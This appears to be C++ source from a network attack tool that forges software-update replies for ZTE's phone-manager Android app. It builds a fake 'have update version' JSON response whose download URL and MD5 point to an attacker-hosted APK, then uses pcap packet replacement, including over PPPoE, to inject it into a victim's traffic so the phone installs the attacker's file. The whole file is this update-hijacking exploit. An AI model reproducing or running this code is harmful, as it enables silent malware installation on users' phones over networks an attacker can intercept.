

#include "ztePlugin.h"
#include "../HttpUtils.h"

int ZTEPluginUpdate::prepareRespData(unsigned long ulIP, string filepath, string filename) {

	char * updatecfg = "{\"result\":{\"resultCode\":\"1\",\"resultMsg\":\"have apps info\"},\"data\":"
		"[{\"id\":58,\"appUID\":\"64c76e5a6774426a8236349d5fde3f3b\",\"appName\":\"phoneManager\",\"pkgName\":\"com.zte.heartyservice\","
		"\"appNameEN\":\"HeartyService\","
		"\"iconURL\":\"http://dlapp.ztems.com/download/img/2015/08/06/fotaicon.png\",\"isNewInstall\":true,\"isNotification\":false,"
		"\"createTime\":\"May 12, 2015 5:40 : 46 PM\",\"updateTime\":\"Dec 7, 2018 8:23:42 PM\",\"oneWordsAppDesc\":\"system software manager\","
		"\"operationcode\":0,\"status\":1,\"isNotificationInstall\":false}]}";

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: text/json;charset=GBK\r\nContent-Length: %u\r\n"
		"Connection: Keep-Alive\r\n\r\n%s";

	m_iRespSize = sprintf(m_lpResp, lpRespFormat, lstrlenA(updatecfg), updatecfg);

	return m_iRespSize;
	
}


int ZTEPluginUpdate::prepareRespData2(unsigned long ulIP, string filepath, string filename) {

	int ret = 0;
	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);

	char * updatecfg = "{\"result\":{\"resultCode\":\"1\",\"resultMsg\":\"have update version\"},\"data\":"
		"[{\"id\":556,\"iconURL\":\"http://dlapp.ztems.com/download/img/2015/08/06/fotaicon.png\",\"apkSize\":%u,\"version\":\"9.9.0\","
		"\"versionCode\":900900,\"downloadURL\":\"http://%s/%s\",\"pkgName\":\"com.zte.heartyservice\",\"appName\":\"ÄãºÃphoneManager\","
		"\"apkMD5\":\"%s\",\"isNewInstall\":true,\"isNotification\":false,\"oneWordsAppDesc\":\"system software manager\","
		"\"releaseNotes\":\"fix some problem\",\"status\":1,\"isNotificationInstall\":false}]}";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, updatecfg, m_filesize, szip.c_str(), filename.c_str(), m_szmd5);

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: text/json;charset=GBK\r\nContent-Length: %u\r\n"
		"Connection: Keep-Alive\r\n\r\n%s";

	m_iRespSize2 = sprintf(m_lpResp2, lpRespFormat, iRespContentLen, lpRespContent);

	return m_iRespSize2;

}



int ZTEPluginUpdate::sendRespData2(pcap_t * pcapT, const char * lppacket, int packetsize, char * ip, int type, LPPPPOEHEADER pppoe) {

	int ret = 0;
	if (m_iRespSize2 && m_lpResp2)
	{
		ret = AttackPacket::ReplacePacket(pcapT, lppacket, packetsize, m_lpResp2, m_iRespSize2, ip, type, pppoe);
	}
	return ret;
}